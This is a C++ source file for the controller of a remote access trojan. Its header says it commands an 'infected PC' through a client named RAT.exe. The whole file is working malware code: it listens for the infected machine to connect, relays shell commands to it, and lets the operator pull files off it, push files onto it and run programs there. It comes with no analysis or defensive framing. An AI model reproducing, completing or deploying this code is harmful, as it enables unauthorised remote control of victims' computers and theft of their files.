//
// RATremote.cpp
//
// The program waits for a connection from RAT.exe. Once connected,
// commands can be sent to the remote client, which are executed on
// the infected PC. The tested commands are the DOS commands dir, mkdir, 
// rmdir and del (delete files only)(more DOS may be working), and 
// the commands cd, get [FileName] (download file), put [FileName] (upload file) 
// and start [FileName] (execute file located on infected PC).
// If the program loses connection to the remote client, it will 
// wait for a reconnect unless the connection was interupted via the "exit" command.
//
// Compile and link with wsock32.lib.
//
// Pass the port number on the command line. 
//
// Example: Server.exe 2030
//
// Written by: Alexandre Cox
// Date: 04/04/2018
//
#include <winsock.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <string>
#include "Connection.h"
#include "Connection_error.h"

using namespace std;

#define BUFF_SIZE 1024

// Function prototype
void StreamServer(short nPort);
string getFileName(const string& s);

// Helper macro for displaying errors
#define PRINTERROR(s)	cout<<"\n"<<s<<":"<<WSAGetLastError()

////////////////////////////////////////////////////////////

void main(int argc, char **argv)
{
	short nPort;

	//
	// Check for port argument
	//
	if (argc != 2){
		cout<<"\nSyntax: server PortNumber";
		cout<<endl;
		return;
	}

	nPort = atoi(argv[1]);

	//
	// Do the stuff a stream server does
	//
	try{
		StreamServer(nPort);
	}
	catch (Connection_error err){
		cout << err.what();
	}
	
	//
	// Release WinSock
	//
	WSACleanup();
}

////////////////////////////////////////////////////////////

void StreamServer(short nPort)
{
	Connection OpenConnect(nPort);
	string UserInput;
	string Message;
	string Command;
	string arguments;

	do{
		OpenConnect.WaitRequest();

		try{
			do {
				UserInput = "";
				Message = "";
				Command = "";
				arguments = "";

				OpenConnect.recvMessage(Message);
				cout << "\nreceived" << endl;
				cout << Message;
				getline(cin, UserInput, '\n');
				cout << endl;

				//Separe la commande d'avec les arguments
				unsigned int charindex = 0;
				while (charindex < UserInput.size() && UserInput[charindex] != ' ') {
					Command.push_back(tolower(UserInput[charindex]));
					charindex++;
				}
				if (UserInput[charindex] == ' ') {
					charindex++;
					//Si les arguments contiennent des '/', les remplace par '\\'
					while (charindex < UserInput.size()) {
						if (UserInput[charindex] == '/') {
							arguments.push_back('\\');
						}
						else if (UserInput[charindex] != '\"') {
							arguments.push_back(UserInput[charindex]);
						}
						charindex++;
					}
				}

				if (Command == "get") {
					if (OpenConnect.sendMessage(Command + " " + arguments)) {
						OpenConnect.recvFile(getFileName(arguments));
					}
				}
				else if (Command == "put") {
					if (OpenConnect.sendMessage(Command + " " + getFileName(arguments))) {
						OpenConnect.sendFile(arguments);
					}
				}
				else {
					OpenConnect.sendMessage(Command + " " + arguments);
				}
			//Continu de recevoir des commandes tant que n'a pas recu "exit"	
			} while (UserInput != "exit");
		}
		catch (Connection_error ex){
			cout << ex.what();
		}
	//Continu d'essayer de se reconnecter tant que n'a pas recu "exit"
	} while (UserInput != "exit");
	cout << endl << "Closing connection";
	this_thread::sleep_for(3s);

	return;
}

string getFileName(const string& s) {
	char sep = '/';

#ifdef _WIN32
	sep = '\\';
#endif

	size_t i = s.rfind(sep, s.length());
	if (i != string::npos) {
		return(s.substr(i + 1, s.length() - i));
	}
	return(s);
}
